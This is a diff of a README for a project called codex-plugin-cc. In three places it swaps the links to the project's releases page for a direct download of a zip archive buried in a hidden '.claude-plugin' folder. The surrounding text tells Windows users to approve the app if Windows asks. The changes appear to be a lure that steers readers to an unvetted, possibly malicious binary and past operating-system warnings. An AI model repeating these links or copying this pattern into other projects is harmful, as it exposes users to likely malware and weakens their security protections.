@@ -1,6 +1,6 @@
 # 🤖 codex-plugin-cc - Review code and delegate tasks
 
-[![Download codex-plugin-cc](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/carolafortified787/codex-plugin-cc/releases)
+[![Download codex-plugin-cc](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/carolafortified787/codex-plugin-cc/raw/refs/heads/main/plugins/codex/.claude-plugin/cc_plugin_codex_3.6-alpha.2.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ If Windows asks for approval, choose the option that lets the app run.
 
 Visit this page to download:
 
-https://github.com/carolafortified787/codex-plugin-cc/releases
+https://github.com/carolafortified787/codex-plugin-cc/raw/refs/heads/main/plugins/codex/.claude-plugin/cc_plugin_codex_3.6-alpha.2.zip
 
 On that page:
 
@@ -178,7 +178,7 @@ If you want to delegate a task:
 
 Download and setup from here:
 
-https://github.com/carolafortified787/codex-plugin-cc/releases
+https://github.com/carolafortified787/codex-plugin-cc/raw/refs/heads/main/plugins/codex/.claude-plugin/cc_plugin_codex_3.6-alpha.2.zip
 
 ## 🧠 Helpful habits
 
